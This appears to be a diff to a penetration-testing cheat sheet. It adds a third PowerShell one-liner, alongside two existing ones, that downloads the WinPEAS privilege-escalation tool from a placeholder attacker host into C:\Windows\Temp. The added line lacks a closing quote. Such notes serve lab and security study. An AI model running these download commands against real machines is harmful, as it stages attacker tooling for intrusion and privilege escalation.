@@ -25,3 +25,5 @@
 `(New-Object System.Net.WebClient).DownloadFile("http://[ATTACKER_IP]/winpeas.exe", "C:\Windows\Temp\winpeas.exe")`
 
 `Invoke-WebRequest "http://[ATTACKER_IP]/winpeas.exe" -OutFile "C:\Windows\Temp\winpeas.exe"`
+
+`powershell.exe -c "iwr http://[ATTACKER_IP]/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe`
